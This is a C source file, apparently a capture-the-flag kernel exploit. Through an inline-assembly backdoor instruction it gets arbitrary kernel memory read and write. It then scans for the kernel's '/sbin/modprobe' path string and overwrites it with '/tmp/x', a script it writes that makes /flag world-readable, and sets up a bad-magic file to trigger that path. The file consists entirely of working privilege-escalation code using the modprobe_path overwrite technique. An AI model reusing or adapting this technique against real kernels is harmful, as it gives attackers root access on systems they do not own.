#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
extern void wait(void*);
size_t kread(size_t addr){
	int pipefd[2];
	size_t val = 0;
	pipe(pipefd);
	if(fork()==0){
		close(pipefd[0]);
		__asm__(
			"mov r11,0x7331733173317331;\n"
			"mov r13,%[addr];\n"
			".ascii \"\\xd4\";\n"
			"mov %[val],r12;\n"
		:[val]"=r"(val):[addr]"r"(addr):"r11","r12","r13");
		write(pipefd[1],&val,8);
		exit(0);

	} else {
		close(pipefd[1]);
		read(pipefd[0],&val,8);
		wait(0);
		close(pipefd[0]);

	}
	return val;
}
void kwrite(size_t addr,size_t val){
	if(fork()==0){
		__asm__(
			"mov r11,0x1337133713371337;\n"
			"mov r12,%[val];\n"
			"mov r13,%[addr];\n"
			".ascii \"\\xd4\";\n"
		::[val]"r"(val),[addr]"r"(addr):"r11","r12","r13");
		exit(0);

	} else {
		wait(0);
	}

}


int main(){
	setvbuf(stdout,0,2,0);
	FILE* fp = fopen("/tmp/x","w");
	fprintf(fp,"#!/bin/sh\nchmod 0777 /flag\n");
	fclose(fp);
	
	fp = fopen("/tmp/y","w");
	fprintf(fp,"\xff\xff\xff\xff");
	fclose(fp);

	chmod("/tmp/x",0777);
	chmod("/tmp/y",0777);

	for(size_t i=0;;i+=0x100000){
		size_t buf[2] = { kread(0xffffffff81c2e9c0ULL+i),kread(0xffffffff81c2e9c8ULL+i), };
		if( strcmp((void*)buf,"/sbin/modprobe") == 0){
			puts((void*)buf);
			strcpy((char*)buf,"/tmp/x");
			kwrite(0xffffffff81c2e9c0ULL+i,buf[0]);
			exit(0);
		}
	}
}

